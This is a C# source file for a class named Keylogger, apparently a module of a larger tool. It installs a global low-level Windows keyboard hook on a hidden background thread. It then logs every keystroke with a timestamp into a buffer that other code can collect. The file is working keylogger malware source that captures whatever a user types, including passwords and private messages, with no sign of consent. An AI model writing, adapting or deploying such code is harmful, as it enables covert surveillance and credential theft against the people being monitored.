using Gma.System.MouseKeyHook;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace G2DK.Functionalities
{
    public class Keylogger
    {
        private static StringBuilder keystrokes = new StringBuilder();
        private static readonly object keyLock = new object();

        private static Thread _hookThread;
        private static bool _hookRunning = false;
        private static readonly object _hookLock = new object();

        private static readonly int WH_KEYBOARD_LL = 13;
        private static readonly int WM_KEYDOWN = 0x0100;

        public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SetWindowsHookEx(int hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        private static IntPtr _hookHandle = IntPtr.Zero;
        private static HookProc _hookProc;

        public static void Start()
        {
            lock (_hookLock)
            {
                if (!_hookRunning)
                {
                    _hookThread = new Thread(() =>
                    {
                        _hookProc = new HookProc(HookCallback);
                        IntPtr hInstance = GetModuleHandle(null);
                        _hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, hInstance, 0);

                        Application.Run();
                    });

                    _hookThread.IsBackground = true;
                    _hookThread.SetApartmentState(ApartmentState.STA);
                    _hookThread.Start();

                    _hookRunning = true;
                }
            }
        }

        public static void Stop()
        {
            lock (_hookLock)
            {
                if (_hookRunning)
                {
                    Unhook();

                    Application.ExitThread();
                    _hookRunning = false;
                }
            }
        }

        public static string GetCapturedKeys()
        {
            lock (keyLock)
            {
                string data = keystrokes.ToString();
                keystrokes.Clear();

                return data;
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                bool isShiftPressed = (Control.ModifierKeys & Keys.Shift) != 0;
                bool isCapsLock = (Console.CapsLock);

                char keyChar = (char)vkCode;

                lock (keyLock)
                {
                    if (key >= Keys.A && key <= Keys.Z)
                    {
                        if (isShiftPressed || isCapsLock)
                        {
                            keystrokes.Append($"[{DateTime.Now:HH:mm:ss}] {keyChar.ToString().ToUpper()} ");
                        }
                        else
                        {
                            keystrokes.Append($"[{DateTime.Now:HH:mm:ss}] {keyChar.ToString().ToLower()} ");
                        }
                    }
                    else if (key == Keys.Tab)
                    {
                        keystrokes.Append("\t");
                    }
                    else if (key == Keys.Space)
                    {
                        keystrokes.Append(" ");
                    }
                    else if (key == Keys.Enter)
                    {
                        keystrokes.AppendLine();
                    }
                    else
                    {
                        keystrokes.Append(key);
                    }
                }
            }

            return (IntPtr)CallNextHookEx(_hookHandle, nCode, wParam, lParam);
        }

        private static void Unhook()
        {
            UnhookWindowsHookEx(_hookHandle);
        }
    }
}